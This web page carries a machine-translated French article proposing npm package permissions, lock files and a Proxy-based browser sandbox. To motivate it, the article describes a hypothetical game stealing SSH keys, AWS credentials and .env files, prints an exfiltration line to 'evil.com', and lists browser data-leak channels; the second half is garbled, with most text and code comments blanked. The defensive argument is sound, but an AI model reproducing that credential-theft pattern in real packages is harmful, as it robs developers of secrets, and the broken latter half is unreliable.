<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü§° üìµ üë©üèø‚Äçüéì Avoir une id√©e: syst√®me d'autorisation pour les packages npm üëáüèø üë©üèæ‚Äçü§ù‚Äçüë©üèº üè§</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Il y a quelques jours, j'ai d'abord lanc√© la calculatrice sur un nouveau t√©l√©phone et j'ai vu ce message: "La calculatrice aimerait acc√©der √† vos cont...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Avoir une id√©e: syst√®me d'autorisation pour les packages npm</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/ruvds/blog/433010/">  Il y a quelques jours, j'ai d'abord lanc√© la calculatrice sur un nouveau t√©l√©phone et j'ai vu ce message: "La calculatrice aimerait acc√©der √† vos contacts." <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/bc6/ab2/2fb/bc6ab22fbd46e2703b3d248480a389cf.png"></div><br>  Au d√©but, ce message me semblait un peu triste (il semblait que la calculatrice √©tait seule), mais ce cas m'a fait r√©fl√©chir ... <br><a name="habracut"></a><br>  Et si, comme les applications t√©l√©phoniques, les packages npm devaient d√©clarer les autorisations n√©cessaires √† leur travail?  Avec cette approche, le fichier de package <code>package.json</code> pourrait ressembler √† ceci: <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"name"</span></span>: <span class="hljs-string"><span class="hljs-string">"fancy-logger"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"version"</span></span>: <span class="hljs-string"><span class="hljs-string">"0.1.0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"permissions"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"browser"</span></span>: [<span class="hljs-string"><span class="hljs-string">"network"</span></span>],   <span class="hljs-attr"><span class="hljs-attr">"node"</span></span>: [<span class="hljs-string"><span class="hljs-string">"http"</span></span>, <span class="hljs-string"><span class="hljs-string">"fs"</span></span>] }, <span class="hljs-attr"><span class="hljs-attr">"etcetera"</span></span>: <span class="hljs-string"><span class="hljs-string">"etcetera"</span></span> }</code> </pre> <br>  Sur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">npmjs.com, une</a> section de la page du package contenant des informations sur les autorisations dont il a besoin pourrait ressembler √† ceci. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/9ab/9e6/76d/9ab9e676da3e313c47d59e564afd21bc.png"></div><br>  <i>Une telle section d'autorisation peut √™tre disponible pour les packages sur le site de registre npm.</i> <br>  Ces listes d'autorisations pour un package peuvent √™tre une combinaison des autorisations de toutes ses d√©pendances avec ses propres autorisations. <br><br>  Un coup d'≈ìil au contenu de la section des <code>permissions</code> du package <code>fancy-logger</code> peut amener le d√©veloppeur √† se demander pourquoi le package qui √©crit quelque chose sur la console doit acc√©der au module <code>http</code> et que cela semble quelque peu suspect. <br><br>  Quel serait le monde dans lequel un syst√®me d'autorisation similaire pour les packages npm serait utilis√©?  Peut-√™tre que quelqu'un ne verra pas l'int√©r√™t de cela, car il se sent compl√®tement en s√©curit√©, par exemple, en utilisant uniquement des packages fiables d'√©diteurs √©prouv√©s.  Pour que tous ceux qui lisent ceci se sentent vuln√©rables, voici une courte histoire. <br><br><h2>  <font color="#3AC1EF">L'histoire de la fa√ßon dont je vole vos variables d'environnement</font> </h2><br>  Je voulais cr√©er un package npm appel√© <code>space-invaders</code> .  C'√©tait int√©ressant d'apprendre √† cr√©er des jeux en √©crivant un jeu qui fonctionne dans la console, et en m√™me temps de justifier mon point de vue sur les vuln√©rabilit√©s li√©es aux packages npm. <br><br>  Vous pouvez ex√©cuter ce jeu avec cette commande: <code>npx space-invaders</code> .  Apr√®s son lancement, on pouvait imm√©diatement commencer √† tirer sur les extraterrestres et tuer le temps. <br><br>  Vous aimeriez ce jeu, vous le partageriez avec des amis, ils aimeraient aussi. <br><br>  Tout cela semble tr√®s positif, mais, vous divertissant, les <code>space-invaders</code> jeu feront leur propre <code>space-invaders</code> , √† savoir la collecte de certaines donn√©es.  Il collectera des informations √† partir de <code>~/.ssh/</code> , <code>~/.aws/credentials</code> , de <code>~/.bash_profile</code> et d'autres endroits similaires, lira le contenu de tous les fichiers <code>.env</code> qu'il peut atteindre, y compris <code>process.env</code> , regardez √† la configuration git (afin de savoir √† qui il recueille les informations), puis elle envoie tout cela √† mon serveur. <br><br>  Je n'ai pas √©crit un tel jeu, mais depuis un certain temps je me sens mal √† l'aise, et quand <code>npm install</code> commande <code>npm install</code> , je pense √† la vuln√©rabilit√© de mon syst√®me.  Maintenant, en regardant l'indicateur de progression de l'installation, je pense au nombre de dossiers et de fichiers standard sur mon ordinateur portable dont le contenu ne doit pas tomber entre de mauvaises mains. <br><br>  Et ce n'est pas seulement mon espace de travail.  Par exemple, je ne sais m√™me pas s'il existe des donn√©es dans certaines variables d'environnement de mon syst√®me d'assemblage de site pour la connexion √† la base de donn√©es du serveur de production.  S'il y a quelque part de telles donn√©es, alors vous pouvez imaginer une situation dans laquelle un paquet npm malveillant installe un script dans le syst√®me con√ßu pour se connecter √† ma base de donn√©es de travail.  Ensuite, ce script ex√©cute la commande <code>SELECT * from users</code> , puis <code>http.get('http://evil.com/that-data')</code> .  Peut-√™tre √©tait-ce pr√©cis√©ment en raison de la possibilit√© de telles attaques que j'ai rencontr√© des conseils selon lesquels les mots de passe ne devraient pas √™tre stock√©s dans des bases de donn√©es en texte brut? <br><br>  Tout cela semble assez effrayant, et cela se produit probablement d√©j√† (bien qu'il soit impossible de dire exactement si cela se produit ou non). <br><br>  Avec cela, peut-√™tre, nous cesserons de parler des cons√©quences du vol de donn√©es importantes.  Revenons au sujet des autorisations pour les packages npm. <br><br><h2>  <font color="#3AC1EF">Modifications des autorisations de verrouillage</font> </h2><br>  Je suppose que ce serait g√©nial de pouvoir voir les autorisations n√©cessaires au package lors de la visualisation du site npm.  Mais il convient de noter que la possibilit√© de voir les autorisations n'est bonne que lorsqu'elle est appliqu√©e √† un moment pr√©cis, en fait, cela ne r√©sout pas le vrai probl√®me. <br><br>  Lors d'un incident r√©cent dans npm, quelqu'un a d'abord publi√© une version de correctif d'un package contenant du code malveillant, puis a publi√© une version mineure dont le code malveillant avait d√©j√† √©t√© supprim√©.  Le temps entre ces deux √©v√©nements a √©t√© suffisant pour mettre en danger de nombreux utilisateurs du colis dangereux. <br><br>  Voil√† le probl√®me.  Pas des packages cr√©√©s par des logiciels malveillants et qui le restent tout le temps.  Le probl√®me est que, dans un package apparemment fiable, vous pouvez tranquillement ajouter quelque chose de mauvais et apr√®s un certain temps l'enlever. <br><br>  En cons√©quence, nous pouvons dire que nous avons besoin d'un m√©canisme pour bloquer l'ensemble des autorisations re√ßues par les packages. <br><br>  Ce sera peut-√™tre quelque chose comme un fichier <code>package-permissions.json</code> qui d√©finit les autorisations pour Node.js et pour le navigateur et contient une liste de packages qui ont besoin de ces autorisations.  Avec cette approche, il serait n√©cessaire de r√©pertorier tous les packages dans un tel fichier, et pas seulement ceux qui se trouvent dans la section des <code>dependencies</code> du fichier <code>package.json</code> du projet. <br><br>  Voici √† quoi pourrait ressembler le fichier <code>package-permissions.json</code> . <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"node"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"http"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"express"</span></span>,     <span class="hljs-string"><span class="hljs-string">"stream-http"</span></span>   ],   <span class="hljs-attr"><span class="hljs-attr">"fs"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"fs-extra"</span></span>,     <span class="hljs-string"><span class="hljs-string">"webpack"</span></span>,     <span class="hljs-string"><span class="hljs-string">"node-sass"</span></span>   ] }, <span class="hljs-attr"><span class="hljs-attr">"browser"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"network"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"whatwg-fetch"</span></span>,     <span class="hljs-string"><span class="hljs-string">"new-relic"</span></span>   ] } }</code> </pre> <br>  Une version r√©elle d'un tel fichier pourrait contenir beaucoup plus d'entr√©es de package. <br><br>  Imaginez maintenant qu'un jour vous mettiez √† jour un package avec deux cents d√©pendances qui seront √©galement mises √† jour.  Une version de correctif a √©t√© publi√©e pour l'une de ces d√©pendances, qui n√©cessitait soudainement un acc√®s au <code>http</code> Node.js. <br><br>  Si cela se produit, la commande <code>npm install</code> √©chouera avec un message semblable au suivant: ¬´Le package <code>add-two-number</code> requis par le package <code>fancy-logger</code> demand√© l'acc√®s au <code>http</code> Node.js.  Ex√©cutez la commande <code>npm update-permissions add-two-numbers</code> pour r√©soudre ce probl√®me, puis r√©ex√©cutez la commande <code>npm install</code> . ¬ª <br><br>  Ici, <code>fancy-logger</code> est le package qui se trouve dans votre fichier <code>package.json</code> (en supposant que vous √™tes familier avec ce package), et le package <code>add-two-numbers</code> est une d√©pendance de <code>fancy-logger</code> dont vous n'avez jamais entendu parler. <br><br>  Bien s√ªr, m√™me s'il existe un fichier dans le syst√®me pour ¬´bloquer¬ª les d√©pendances, certains d√©veloppeurs confirmeront les nouvelles autorisations sans penser √† rien.  Mais, au minimum, un changement dans <code>package-permissions.json</code> sera visible dans la demande de tirage, c'est-√†-dire qu'il y aura une chance qu'un autre d√©veloppeur plus responsable y pr√™te attention. <br><br>  En outre, les modifications des autorisations demand√©es n√©cessiteraient que le registre npm lui-m√™me avertisse les auteurs de packages lorsqu'une situation change quelque part dans l'arborescence de d√©pendances de leurs packages.  Peut-√™tre - cela se fera par e-mail avec le contenu suivant: <br><br>  "Bonjour, auteur de <code>fancy-logger</code> .  Nous vous informons que <code>add-two-number</code> , le package dont vous utilisez les capacit√©s, a demand√© l'autorisation de travailler avec le module <code>http</code> .  Vos autorisations de package, comme indiqu√© sur <code>npmjs.com/package/fancy-logger</code> , ont √©t√© mises √† jour en cons√©quence. ¬ª <br><br>  Bien s√ªr, cela ajoutera au travail des auteurs des packages et de npm lui-m√™me, mais ces choses m√©riteront d'y passer un peu de temps.  Dans ce cas, l'auteur de l' <code>add-two-numbers</code> peut √™tre absolument s√ªr que s'il demande l'autorisation de travailler avec le module <code>http</code> , cela entra√Ænera le d√©clenchement de nombreuses "alarmes" dans le monde. <br><br>  Voil√† ce dont nous avons besoin.  Hein?  J'aimerais esp√©rer que, comme dans le cas des applications t√©l√©phoniques, et m√™me dans le cas des extensions pour Chrome, les packages qui n√©cessitent moins d'autorisations seront plus populaires aupr√®s des utilisateurs que ceux qui ont besoin d'un niveau d'acc√®s inexplicablement √©lev√© aux syst√®mes.  Ceci, √† son tour, fera tr√®s bien r√©fl√©chir les auteurs de packages lors du choix des autorisations requises pour leur d√©veloppement. <br><br>  Supposons que npm d√©cide d'introduire un syst√®me d'autorisation.  Le premier jour du lancement d'un tel syst√®me, tous les packages seront consid√©r√©s comme n√©cessitant des autorisations compl√®tes (une telle d√©cision sera prise plus tard - dans les cas o√π la section des <code>permissions</code> est manquante dans <code>package.json</code> ). <br><br>  L'auteur du package, qui souhaite affirmer que son package ne n√©cessite pas d'autorisations sp√©ciales, sera int√©ress√© par l'ajout de la section des <code>permissions</code> dans <code>package.json</code> tant qu'objet vide.  Et, si les auteurs des packages sont suffisamment int√©ress√©s pour que les autorisations de d√©pendance ne ¬´surchargent¬ª pas leurs packages, ils essaieront de s'assurer que ces packages de d√©pendance ne n√©cessitent pas non plus d'autorisations sp√©ciales, par exemple, en effectuant des requ√™tes d'extraction appropri√©es dans le r√©f√©rentiel de d√©pendances. <br><br>  De plus, chaque auteur du package s'efforcera de r√©duire le risque de vuln√©rabilit√© de son package lors de la rupture de l'une de ses d√©pendances.  Par cons√©quent, si les auteurs des packages utilisent des d√©pendances qui n√©cessitent des autorisations qui, semble-t-il, ne sont pas n√©cessaires, ils seront incit√©s √† passer √† l'utilisation d'autres packages. <br><br>  Et dans le cas des d√©veloppeurs qui utilisent des packages npm lors de la cr√©ation d'applications, cela les obligera √† porter une attention particuli√®re aux packages utilis√©s dans leurs projets, en choisissant principalement ceux qui ne n√©cessitent pas d'autorisations sp√©ciales.  Dans le m√™me temps, bien s√ªr, certains packages, pour des raisons objectives, n√©cessiteront des autorisations qui peuvent causer des probl√®mes, mais ces packages sont susceptibles d'√™tre sous le contr√¥le sp√©cial des d√©veloppeurs. <br><br>  Peut-√™tre que quelque chose comme <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Greenkeeper</a> peut aider d'une mani√®re ou d'une autre √† r√©soudre tous ces probl√®mes. <br><br>  Enfin, le fichier <code>package-permissions.json</code> fournira un r√©sum√© facile √† comprendre pour un professionnel de la s√©curit√© qui √©value les ¬´trous¬ª potentiels dans une application et vous permet de poser des questions sp√©cifiques sur les packages controvers√©s et leurs autorisations. <br><br>  En cons√©quence, j'esp√®re que cette simple propri√©t√© d' <code>permissions</code> pourra se r√©pandre assez largement parmi environ 800 000 packages npm et rendre npm plus s√ªr. <br><br>  Bien s√ªr, cela n'emp√™chera pas d'√©ventuelles attaques.  Tout comme les autorisations demand√©es par les applications mobiles ne rendent pas impossible la cr√©ation d'applications mobiles malveillantes distribu√©es sur les sites officiels.  Mais cela r√©duira la ¬´surface d'attaque¬ª aux packages qui demandent explicitement la permission d'effectuer certaines actions qui pourraient constituer une menace pour les syst√®mes informatiques.  De plus, il sera int√©ressant de savoir quel pourcentage de packages ne n√©cessite aucune autorisation sp√©ciale. <br><br>  Voici √† quoi ressemble le m√©canisme de travail avec les autorisations pour les packages npm.  Si cette id√©e devient r√©alit√©, nous pouvons soit compter sur le fait que les attaquants d√©criront honn√™tement leurs packages en d√©clarant des autorisations, soit combiner le syst√®me de d√©claration d'autorisations avec le m√©canisme de restriction forc√©e des capacit√©s des packages en fonction des autorisations demand√©es par eux.  C'est une question int√©ressante.  Voyons cela comme appliqu√© √† Node.js et aux navigateurs. <br><br><h2>  <font color="#3AC1EF">Forcer les restrictions de package en fonction des autorisations demand√©es par eux dans Node.js</font> </h2><br>  Ici, je vois deux options possibles pour appliquer de telles restrictions. <br><br><h3>  <font color="#3AC1EF">‚ñç Option 1: package npm sp√©cial for√ßant des mesures de s√©curit√©</font> </h3><br>  Imaginez un package cr√©√© et maintenu par npm (ou une autre organisation faisant √©galement autorit√© et visionnaire).  Laissez ce paquet s'appeler <code>@npm/permissions</code> . <br><br>  Un tel package serait soit inclus dans le code d'application avec la premi√®re commande d'importation, soit les applications seraient lanc√©es avec une commande de la forme <code>node -r @npm/permissions index.js</code> . <br><br>  Un package remplacerait les autres commandes d'importation afin de ne pas violer les autorisations indiqu√©es dans la section <code>permissions</code> des fichiers <code>package.json</code> des autres packages.  Si l'auteur d'un certain package <code>lovely-logger</code> n'a pas d√©clar√© la n√©cessit√© de ce package dans le module <code>http</code> Node.js, cela signifie qu'un tel package n'est pas accessible par ce module. <br><br>  √Ä strictement parler, le blocage de modules Node.js entiers de cette fa√ßon n'est pas id√©al.  Par exemple, le package de <code>methods</code> npm charge le module <code>http</code> Node.js, mais n'envoie aucune donn√©e √† l'aide de celui-ci.  Il prend simplement l'objet <code>http.METHODS</code> , convertit son nom en <code>http.METHODS</code> et l'exporte en tant que package npm classique.  Maintenant, un tel package ressemble √† une excellente cible pour un attaquant - il a 6 millions de t√©l√©chargements par semaine, alors qu'il n'a pas chang√© depuis 3 ans.  Je pourrais √©crire aux auteurs de ce paquet et les inviter √† me donner son r√©f√©rentiel. <br><br>  Compte tenu du package de <code>methods</code> , il serait pr√©f√©rable de consid√©rer qu'il ne n√©cessite pas d'autorisation <code>network</code> , et pas d'autorisation qui donne acc√®s au module <code>http</code> .  Ensuite, cette restriction peut √™tre corrig√©e √† l'aide d'un m√©canisme externe et neutraliser toute tentative de ce package d'envoyer certaines donn√©es √† partir des syst√®mes dans lesquels il fonctionne. <br><br>  Le package imaginaire <code>@npm/permissions</code> pourrait √©galement restreindre l'acc√®s d'un package √† tout autre package qui n'√©tait pas r√©pertori√© comme ses d√©pendances.  Cela emp√™chera le package, par exemple, d'importer quelque chose comme <code>fs-extra</code> et <code>request</code> , et utilisera les capacit√©s de ces packages pour lire les donn√©es du syst√®me de fichiers et envoyer des donn√©es lues √† un attaquant. <br><br>  De m√™me, il peut √™tre utile de faire la distinction entre l'acc√®s au disque ¬´interne¬ª et ¬´externe¬ª.  Je suis tr√®s heureux que le <code>node-sass</code> besoin d'acc√©der aux mat√©riaux situ√©s dans le r√©pertoire de mon projet, mais je ne vois aucune raison pour que ce package ait besoin d'acc√©der √† quoi que ce soit en dehors de ce r√©pertoire. <br><br>  Peut-√™tre qu'au tout d√©but de l'introduction du syst√®me d'autorisation, le package <code>@npm/permissions</code> devra √™tre ajout√© aux projets manuellement.  Peut-√™tre, pendant la p√©riode de transition, pendant l'√©limination des dysfonctionnements in√©vitables, c'est la seule approche raisonnable pour utiliser un tel m√©canisme.  Mais pour assurer une r√©elle s√©curit√©, il est n√©cessaire que ce package soit √©troitement int√©gr√© au syst√®me, car il sera n√©cessaire de prendre en compte les autorisations lors de l'ex√©cution des scripts d'installation du package. <br><br>  Ensuite, tr√®s probablement, il s'av√®re qu'une simple commande de la forme <code>"enforcePermissions": true</code> dans le fichier <code>package.json</code> du projet dira √† npm d'ex√©cuter tous les scripts avec l'utilisation forc√©e des autorisations d√©clar√©es par eux. <br><br><h3>  <font color="#3AC1EF">‚ñç Option 2: Node.js en mode sans √©chec</font> </h3><br>  Le mode de fonctionnement sp√©cial de Node.js, ax√© sur un niveau de s√©curit√© accru, n√©cessitera √©videmment des modifications plus s√©rieuses.  Mais peut-√™tre qu'√† long terme, la plateforme Node.js elle-m√™me pourra appliquer les restrictions d√©finies par les autorisations d√©clar√©es par chaque package. <br><br>  D'une part, je sais que ceux qui d√©veloppent la plateforme Node.js s'efforcent de r√©soudre les probl√®mes de cette plateforme, et mes id√©es sur la s√©curit√© des packages npm d√©passent le cadre de leurs int√©r√™ts.  Apr√®s tout, au final, npm n'est que la technologie qui accompagne Node.js.  D'un autre c√¥t√©, les d√©veloppeurs de Node.js souhaitent que les utilisateurs en entreprise se sentent en confiance en travaillant avec cette plate-forme, et la s√©curit√©, probablement, est l'un de ces aspects de Node.js qui ne devrait pas √™tre laiss√© √† la ¬´communaut√©¬ª. <br><br>  Donc, pour l'instant, tout ce dont nous avons parl√© semblait assez simple et se r√©sumait √† garantir que le syst√®me d'une mani√®re ou d'une autre surveillerait les capacit√©s utilis√©es par les modules pendant le fonctionnement de Node.js. <br><br>  Parlons maintenant des navigateurs.  Tout ici n'a pas l'air si clair et compr√©hensible du tout. <br><br><h2>  <font color="#3AC1EF">Restriction forc√©e des capacit√©s des packages conform√©ment aux autorisations demand√©es dans les navigateurs</font> </h2><br>  √Ä premi√®re vue, la restriction forc√©e des capacit√©s des packages dans les navigateurs semble encore plus facile, car le code qui s'ex√©cute dans le navigateur ne peut pas faire grand-chose par rapport au syst√®me d'exploitation sur lequel le navigateur est bas√©.  En fait, dans le cas des navigateurs, vous n'avez qu'√† vous soucier de la capacit√© des paquets √† transf√©rer des donn√©es vers des adresses inhabituelles. <br><br>  Le probl√®me ici est qu'il existe d'innombrables fa√ßons d'envoyer des donn√©es du navigateur de l'utilisateur au serveur de l'attaquant. <br><br>  C'est ce qu'on appelle une exfiltration ou une fuite de donn√©es, et si vous demandez √† un professionnel de la s√©curit√© comment √©viter cela, lui, avec l'apparence de la personne qui a invent√© la poudre √† canon, vous dira d'arr√™ter d'utiliser npm. <br><br>  Je crois que pour les packages fonctionnant dans les navigateurs, vous devez faire attention √† une seule r√©solution - celle qui est responsable de la capacit√© de travailler avec le r√©seau.  Appelons cela un <code>network</code> .  Il peut y avoir d'autres autorisations dans cet environnement (telles que celles qui r√©gulent l'acc√®s au DOM ou au stockage local), mais ici je pars de l'hypoth√®se que notre principale pr√©occupation est la possibilit√© de fuite de donn√©es. <br><br>  Les donn√©es du navigateur peuvent √™tre ¬´supprim√©es¬ª de plusieurs fa√ßons.  Voici ceux dont je me souvenais en 60 secondes: <br><br><ul><li>  <code>fetch</code> API. </li><li>  Sockets Web </li><li>  Technologie WebRTC. </li><li>  Constructeur d' <code>EventSource</code> . </li><li>  API <code>XMLHttpRequest</code> </li><li>  D√©finition de la propri√©t√© <code>innerHTML</code> de divers √©l√©ments (vous pouvez cr√©er de nouveaux √©l√©ments). </li><li>  Cr√©ation d'un objet image avec la <code>new Image()</code> commande <code>new Image()</code> (la propri√©t√© <code>src</code> d'une image peut servir de moyen d'exfiltration de donn√©es). </li><li>  D√©finition de <code>document.location</code> , <code>window.location</code> , etc. </li><li>  Modification des propri√©t√©s <code>src</code> d'une image existante, <code>iframe</code> ou quelque chose comme √ßa. </li><li>  Modifications de la propri√©t√© <code>target</code> de l'√©l√©ment <code>&lt;form&gt;</code> . </li><li>  Utiliser une cha√Æne intelligemment con√ßue pour acc√©der √† l'un des m√©canismes ci-dessus ou pour acc√©der √† quelque chose en <code>top</code> ou en <code>self</code> au lieu de <code>windows</code> . </li></ul><br>  Il convient de noter qu'une bonne politique de s√©curit√© du contenu (CSP) est capable de neutraliser certaines de ces menaces, mais cela ne s'applique pas √† toutes.  Si quelqu'un peut me corriger, je serai heureux, mais je crois que vous ne pouvez jamais compter sur le fait que CSP vous prot√©gera compl√®tement contre les fuites de donn√©es.  Une personne m'a dit un jour que le CSP offre une protection presque compl√®te contre un grand nombre de menaces.  √Ä cela, j'ai r√©pondu que vous ne pouvez pas √™tre un peu enceinte, et depuis lors, nous n'avons pas communiqu√© avec cette personne. <br><br>  Si vous abordez judicieusement la recherche de moyens de voler des donn√©es du navigateur, je suis s√ªr qu'il est assez r√©aliste de dresser une liste assez compl√®te de ces m√©thodes. <br><br>  Maintenant, nous devons trouver un m√©canisme pour refuser l'acc√®s √† l'utilisation des opportunit√©s √† partir d'une liste similaire. <br><br>        Webpack (,    <code>@npm/permissions-webpack-plugin</code> ),     : <br><br><ul><li>         <code>browser</code>  <code>package-permissions.json</code>   ,  npm-      (  -  ,  ). </li><li>  ,   ,     ,        API,        . </li></ul><br> (,       Parcel, Rollup, Browserify     ). <br><br> , ,     -.    ,          ,        , , ,        . <br><br>   ,        ( Lodash, Moment,   ),       .        . <br><br>            . <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//   (),   ,    function bigFrameworkWrapper(newWindow) { /*  --     -- */ const window = newWindow; const document = window.document; //      /*  --    -- */ const module = {   doSomething() {     const newDiv = document.createElement('div'); //      const newScript = document.createElement('script'); //      const firstDiv = document.querySelector('div'); //    }, }; return module; } //   ( ),   ,    function smallUtilWrapper(newWindow) { /*  --     -- */ const window = newWindow; const document = window.document; //      /*  --    -- */ const module = {   doSomething() {     const newDiv = document.createElement('div'); //      const newScript = document.createElement('script'); //  !     const firstDiv = document.querySelector('div'); //    }, }; return module; } const restrictedWindow = new Proxy(window, { get(target, prop, receiver) {   if (prop === 'document') {     return new Proxy(target.document, {       get(target, prop, receiver) {         if (prop === 'createElement') {           return new Proxy(window.document.createElement, {             apply(target, thisArg, argumentsList) {               if (['script', 'img', 'audio', 'and-so-on'].includes(argumentsList[0])) {                 console.error('A module without permissions attempted to create a naughty element');                 return false;               }               return target.apply(window.document, argumentsList);             },           });         }         const result = Reflect.get(target, prop, receiver);         if (typeof result === 'function') return result.bind(target);         return result;       },     });   }   return Reflect.get(target, prop, receiver); }, }); const bigFramework = bigFrameworkWrapper(window); bigFramework.doSomething(); //   const smallUtil = smallUtilWrapper(restrictedWindow); smallUtil.doSomething(); // ! "A module without permissions attempted to create a naughty element"</span></span></code> </pre> <br>  <code>function bigFrameworkWrapper(newWindow) {</code>  <code>function smallUtilWrapper(newWindow) {</code> ‚Äî  ,    .  ¬´¬ª      . <br><br>   <code>const newScript = document.createElement('script'); //  !</code>  ,         ‚Äî    <code>script</code> . <br><br>   <code>const bigFramework = bigFrameworkWrapper(window);</code>  <code>const smallUtil = smallUtilWrapper(restrictedWindow);</code>  ¬´¬ª     . ,      ,    . <br><br>   <code>const restrictedWindow = new Proxy(window, {</code>    <code>window</code> ,    ,     <code>window</code> ,   ,           <code>window.document.createElement</code>    DOM  . <br><br>     <code>Proxy</code> . <br><br>       .         ,           . <br><br> ,   ,       API,      .   ,     ,   ,  ,  ,     ,        ,    ,   ,     ,  ¬´¬ª   . <br><br>      ,   ,     ,   -     . <br><br> , ,  ,        ,       <code>Proxy</code> . ,      90% ,   .        ,         ,   . ,    -   ,             ,   ,  . <br><br>  ,   , ,       ,     ,              Node.js       . <br><br><h2> <font color="#3AC1EF"> </font> </h2><br>  ,   ,    HTTP   ,  , ,          -.  C'est compr√©hensible. <br><br>     -,   ,  ,              .    <code>iframe</code> ,    .     <code>sandbox</code> ,    ,     .  ,    ,   ,     -. <br><br> ,   ,     <code>sandbox</code>  <code>&lt;script&gt;</code> .     : <code>&lt;script src="/some-package.js" sandbox="allow-exfiltration allow-whatevs"&gt;&lt;script&gt;</code> .      ,       ,      ,      - <code>create-react-app</code> ,   1.4   ,          . <br><br>     ,            npm  ,      . <br><br>  ,      -  . <br><br> ,  ,    -    ¬´ ...¬ª,     ,   ,       ? <br><br><h2>  <font color="#3AC1EF">R√©sum√©</font> </h2><br>  ,   ,     , ,              .      ,  90% ,   ,    ,    10% ‚Äî ,    . <br><br> ,          ,           -  . <br><br>  <b>Chers lecteurs!</b>   ,  ,       npm,   -? <br><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><img src="https://habrastorage.org/files/1ba/550/d25/1ba550d25e8846ce8805de564da6aa63.png"></a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr433010/">https://habr.com/ru/post/fr433010/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr432998/index.html">Histoire de No√´l</a></li>
<li><a href="../fr433000/index.html">Compilation de Kotlin: JetBrains VS ANTLR VS JavaCC</a></li>
<li><a href="../fr433002/index.html">Venez vous-m√™me ... ou les r√®gles de la communication en √©quipe</a></li>
<li><a href="../fr433004/index.html">Une strat√©gie de migration cloud robuste pour 2019: 7 conseils</a></li>
<li><a href="../fr433008/index.html">Les p√©riph√©riques USB constituent une menace ¬´soudaine¬ª</a></li>
<li><a href="../fr433012/index.html">Peut-√™tre que je ne suis en vie qu'√† cause d'elle: pourquoi les patients souffrant d'apn√©e s'appuient-ils sur un programme √©crit par un pirate</a></li>
<li><a href="../fr433014/index.html">Blagues sur la r√©cente lib√©ration d'astronautes dans l'espace</a></li>
<li><a href="../fr433016/index.html">Changements d'interface, animation en couches et chaos visuel structur√©: un examen des tendances Web pour 2019</a></li>
<li><a href="../fr433018/index.html">UDB. Qu'est-ce que c'est? Partie 2. Chemin de donn√©es</a></li>
<li><a href="../fr433030/index.html">Live: performances frontales</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
